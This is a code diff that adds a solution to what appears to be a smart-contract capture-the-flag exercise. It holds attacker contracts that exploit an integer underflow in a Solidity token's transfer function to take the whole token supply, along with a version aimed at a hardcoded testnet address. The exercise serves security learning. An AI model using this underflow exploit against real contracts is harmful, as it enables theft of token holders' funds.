@@ -2,7 +2,7 @@
 
 // exercise code requires older solc to enable underflow/overflow
 // hardhat.config.js already configured with appropriate version
-pragma solidity ^0.6.0;
+pragma solidity >=0.6.8 <0.7.5;
 
 contract Token {
 
@@ -28,8 +28,15 @@ contract Token {
 
 // solution used by unit test
 // see https://solidity-by-example.org/hacks/overflow/
-// all tokens belong to address that creates contract
+// all 21000000 tokens belong to address that creates contract
 // user given 20 tokens after contract creation
+// user sends those 20 tokens to the attack contract
+// creator address starts with 20999980 tokens, figured this out by
+// await contract.balanceOf('') with the address from 'level'
+// enable debugging to play with overflow/underflow
+//import "hardhat/console.sol";
+
+// will steal entire 21000000 initial supply to user address
 contract TokenAttack {
    Token token;
 
@@ -38,12 +45,15 @@ contract TokenAttack {
   }
 
   function attack() public {
+    uint input = (20 - type(uint).max) * 1000000;
+    //console.log("%i", input);
+    token.transfer(msg.sender, input);
   }
 }
 
 
 // solution used to deploy live to testnet
-pragma solidity ^0.6.0;
+pragma solidity >=0.6.8 <0.7.5;
 
 // vulnerable contract stub with required function
 contract TokenLive {
@@ -55,7 +65,7 @@ contract TokenLive {
 contract TokenAttackLive {
   // todo: change this address to your vulnerable contract instance address
   // before deploying this file to testnet via remix
-  address TOKEN_ADDRESS = 0xD95d07691c0081e422b529510feb51F554B010c2;
+  address TOKEN_ADDRESS = 0x40f4D972e91Ab57BE6fAdE29d24367542eEe1ba9;
 
   TokenLive token;
 
@@ -64,6 +74,7 @@ contract TokenAttackLive {
   }
 
   function attack() public {
-    //token.changeOwner(msg.sender);
+    uint input = (20 - type(uint).max) * 1000000;
+    token.transfer(msg.sender, input);
   }
 }
